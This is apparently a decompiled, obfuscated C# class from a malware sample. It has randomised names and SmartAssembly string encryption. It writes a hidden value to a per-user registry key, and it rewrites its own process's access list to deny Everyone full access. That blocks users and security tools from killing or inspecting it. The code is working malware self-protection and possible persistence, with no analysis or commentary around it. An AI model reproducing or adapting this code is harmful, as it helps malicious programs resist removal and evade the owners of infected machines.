using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fAuBSMaVICral;

internal sealed class mxkHmTSiPMyQJW
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr MUuvcbvKsbACI, int pTzNYNrgqN, [Out] byte[] GAZsVeporwyP, uint zvXOBEklYcDI, out uint BBazmhWJMKVRAT);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr KNiqntOnvXYbOMeaM, int rrrYdMdJNIyqcp, [In] byte[] UYJtdTfvKISvGJUgsU);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void hhmmhSjhgLg(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107365427)));
			registryKey.SetValue(YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107365322)), getString_0(107395899));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor mTNXPrqdjcmvk(IntPtr intptr_0)
	{
		byte[] gAZsVeporwyP = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, gAZsVeporwyP, 0u, out var BBazmhWJMKVRAT);
		if ((long)BBazmhWJMKVRAT > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, gAZsVeporwyP = new byte[BBazmhWJMKVRAT], BBazmhWJMKVRAT, out BBazmhWJMKVRAT))
		{
			return null;
		}
		return new RawSecurityDescriptor(gAZsVeporwyP, 0);
	}

	private void QbJfMqngKa(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void QSgzXGMuHCEjXx()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = mTNXPrqdjcmvk(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			QbJfMqngKa(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static mxkHmTSiPMyQJW()
	{
		Strings.CreateGetStringDelegate(typeof(mxkHmTSiPMyQJW));
	}
}
